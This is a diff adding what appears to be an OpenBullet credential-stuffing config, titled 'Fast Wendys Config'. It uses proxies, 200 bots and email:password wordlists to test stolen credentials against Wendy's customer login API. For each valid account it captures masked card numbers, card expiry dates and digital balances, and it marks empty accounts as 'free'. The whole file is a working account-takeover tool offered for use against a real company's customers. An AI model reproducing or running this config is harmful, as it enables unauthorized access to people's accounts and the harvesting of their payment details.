@@ -1,0 +1,104 @@
+[SETTINGS]
+{
+  "Name": "Fast Wendys Config",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-10-06T11:24:13.346583-07:00",
+  "AdditionalInfo": "",
+  "Author": "Unpainful_",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GEN_UUID FUNCTION RandomString "?d?l?l?l?l?l?d?d-?l?l?d?l-4?d?d?d-?l?d?d?d-?d?d?l?d?d?l?d?l?d?l?l?l" -> VAR "UUID" 
+
+#POST_DATA REQUEST POST "https://customerservices.wendys.com/CustomerServices/rest/login?lang=en&cntry=US&sourceCode=MY.WENDYS&version=5.24.1" 
+  CONTENT "{\"lang\":\"en\",\"cntry\":\"US\",\"deviceId\":\"<UUID>\",\"sourceCode\":\"MY.WENDYS\",\"version\":\"5.24.1\",\"login\":\"<USER>\",\"password\":\"<PASS>\",\"keepSignedIn\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://my.wendys.com" 
+  HEADER "Referer: https://my.wendys.com/login" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+#VALID? KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "serviceStatus\":\"1" 
+  KEYCHAIN Success OR 
+    KEY "serviceStatus\":\"SUCCESS" 
+
+#PARSE_TOKEN PARSE "<SOURCE>" JSON "token" -> VAR "TOKEN" 
+
+#PARSE_POSTAL PARSE "<SOURCE>" JSON "postal" -> VAR "POSTAL" 
+
+#GET_PAYMENT REQUEST POST "https://orderservice.wendys.com/OrderingServices/rest/paymentMethod/get?lang=en&cntry=US&sourceCode=MY.WENDYS&version=5.24.1" 
+  CONTENT "{\"token\":\"<TOKEN>\",\"deviceId\":\"<UUID>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://my.wendys.com" 
+  HEADER "Referer: https://my.wendys.com/payment-options" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+#PARSE_PAYSTAT PARSE "<SOURCE>" LR "{" "}" -> VAR "PAYSTAT" 
+
+#PARSE_DATA PARSE "<SOURCE>" JSON "maskedAccountNumber" -> VAR "DATA" 
+
+#PARSE_EXP PARSE "<SOURCE>" JSON "expirationDate" -> VAR "EXP" 
+
+#CAP_METHOD PARSE "<SOURCE>" JSON "methodName" -> CAP "Payment Method" "" " | **<DATA> | Exp: <EXP>" 
+
+#GET_BALANCE_DATA REQUEST POST "https://customerservices.wendys.com/CustomerServices/rest/balance/combined?lang=en&cntry=US&sourceCode=MY.WENDYS&version=5.24.1" 
+  CONTENT "{\"lang\":\"en\",\"cntry\":\"US\",\"deviceId\":\"<UUID>\",\"token\":\"<TOKEN>\",\"sourceCode\":\"MY.WENDYS\",\"version\":\"5.24.1\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "DNT: 1" 
+  HEADER "Origin: https://my.wendys.com" 
+  HEADER "Referer: https://my.wendys.com/payment-options" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+
+#CAP_BALANCE PARSE "<SOURCE>" JSON "amount" -> CAP "Digital Balance" "$" "" 
+
+#PARSE_BALANCESTAT PARSE "<SOURCE>" LR "{" "}" -> VAR "BALANCESTAT" 
+
+#FREE? KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<PAYSTAT>" DoesNotContain "methodName" 
+    KEY "<BALANCESTAT>" Contains "amount\":0" 
+
